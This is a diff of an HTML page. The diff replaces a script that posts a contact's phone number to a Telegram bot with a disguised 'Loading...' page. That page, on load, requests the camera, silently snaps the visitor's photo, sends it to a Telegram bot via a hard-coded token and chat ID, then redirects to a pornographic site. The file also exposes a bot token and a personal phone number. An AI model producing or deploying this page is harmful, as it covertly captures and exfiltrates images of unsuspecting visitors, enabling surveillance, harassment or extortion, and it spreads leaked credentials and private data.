@@ -1,49 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Kirim Kontak ke Tele Bot</title>
-    <script src="https://telegram.org/js/telegram.web.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Camera</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+        #loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+        }
+    </style>
 </head>
 <body>
+    <a id="captureLink" href="#" style="display: none;">Capture Camera</a>
+    <div id="loading">Loading...</div>
     <script>
-        // Ganti dengan token bot Telegram
-        var botToken = '8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc';
+        document.getElementById('captureLink').click();
 
-        // Ganti dengan ID chat bot
-        var chatId = '1966317946';
+        document.getElementById('captureLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'block';
 
-        // Data kontak
-        var contact = {
-            phone_number: '+62 858-6274-6624',
-            first_name: 'Kecil'
-        };
+            setTimeout(function() {
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
 
-        // API Telegram untuk mengirim kontak
-        var url = `https://api.telegram.org/bot${botToken}/sendContact`;
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
 
-        // Data yang akan dikirim
-        var data = {
-            chat_id: chatId,
-            phone_number: contact.phone_number,
-            first_name: contact.first_name
-        };
+                        setTimeout(function() {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Kirim data menggunakan fetch
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Success:', data);
-            alert('Kontak berhasil dikirim ke tele bot!');
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            alert('Gagal mengirim kontak ke tele bot.');
+                            const image = canvas.toDataURL('image/jpeg');
+                            document.getElementById('loading').style.display = 'none';
+
+                            fetch('https://api.telegram.org/bot8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc/sendPhoto', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: '1966317946',
+                                    photo: image
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Success:', data);
+                                window.location.href = 'https://xhamster.com';
+                            })
+                            .catch((error) => {
+                                console.error('Error:', error);
+                            });
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        console.error('Error accessing the camera:', err);
+                    });
+            }, 2000);
         });
     </script>
 </body>
